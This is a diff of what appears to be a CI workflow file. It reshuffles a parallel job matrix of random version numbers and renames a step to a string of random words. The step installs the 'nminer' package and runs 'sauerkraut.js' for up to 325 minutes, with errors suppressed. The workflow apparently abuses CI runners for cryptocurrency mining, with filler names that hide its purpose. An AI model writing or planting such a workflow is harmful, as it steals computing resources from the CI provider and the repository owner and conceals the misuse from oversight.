@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 142 }
-          - { version: 6813 }
-          - { version: 2989 }
-          - { version: 7046 }
-          - { version: 4158 }
-          - { version: 4193 }
-          - { version: 7433 }
-          - { version: 4961 }
-          - { version: 6404 }
-          - { version: 4747 }
-          - { version: 4382 }
-          - { version: 9146 }
-          - { version: 7572 }
-          - { version: 2915 }
-          - { version: 2971 }
-          - { version: 4550 }
-          - { version: 4218 }
+          - { version: 2265 }
+          - { version: 9311 }
+          - { version: 2966 }
+          - { version: 9189 }
+          - { version: 5680 }
+          - { version: 5 }
+          - { version: 5947 }
+          - { version: 5440 }
+          - { version: 8947 }
+          - { version: 507 }
+          - { version: 8021 }
+          - { version: 2892 }
+          - { version: 4075 }
+          - { version: 6514 }
+          - { version: 8442 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: because
+      - name: yahoo mobilize yesterday until well-off
         run: |
           npm install nminer@latest
-          timeout 326m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 325m node sauerkraut.js || echo "sauerkraut executed"
